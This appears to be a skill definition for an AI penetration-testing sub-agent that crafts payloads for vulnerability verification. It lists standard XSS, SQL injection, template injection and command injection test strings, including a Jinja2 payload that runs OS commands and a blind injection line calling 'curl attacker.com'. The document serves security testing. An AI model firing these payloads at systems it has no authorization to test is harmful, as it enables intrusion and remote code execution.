---
name: payload-research
description: Payload crafting and bypass research for vulnerability verification
tags: [pentest, payload, research]
---

# Payload Research Skill

## When to Use
Use this skill when you need to research, craft, or refine payloads for vulnerability verification.

## Focus Areas
- Input point analysis: where does user input enter the application?
- Filter/WAF identification: what gets blocked or sanitized?
- Encoding research: URL encoding, HTML entities, Unicode, double encoding
- Bypass techniques: alternative syntax, case variations, null bytes
- Signal identification: what observable behavior confirms the vulnerability?

## Payload Categories

### XSS Payloads
- Basic: `<script>alert(1)</script>`
- Event handlers: `<img onerror=alert(1) src=x>`
- SVG: `<svg onload=alert(1)>`
- Template injection: `{{constructor.constructor('alert(1)')()}}`

### SQLi Payloads
- Detection: `' OR '1'='1`, `1; SELECT 1--`
- Union: `' UNION SELECT null,null--`
- Time-based: `'; WAITFOR DELAY '0:0:5'--`

### SSTI Payloads
- Detection: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### Command Injection
- Basic: `; id`, `| id`, `` `id` ``
- Blind: `; sleep 5`, `| curl attacker.com`

## Output Standards
- Submit canonical machine output through `submit_sub_agent_output` exactly once.
- Keep `candidate_findings.status` as `candidate` (no final vulnerability verdicts here).
- If a `hypothesis_id` is provided, all submitted hypotheses/findings must remain on that single hypothesis.
- If orchestrator state already marks `goal_achieved=true`, default action is stop and hand off to document/report unless deep-dive is explicitly requested.
- Provide ready-to-use payloads with prerequisites and expected success/failure signals.
- Optional markdown explanation is allowed, but machine ingestion only reads the submitted JSON payload.
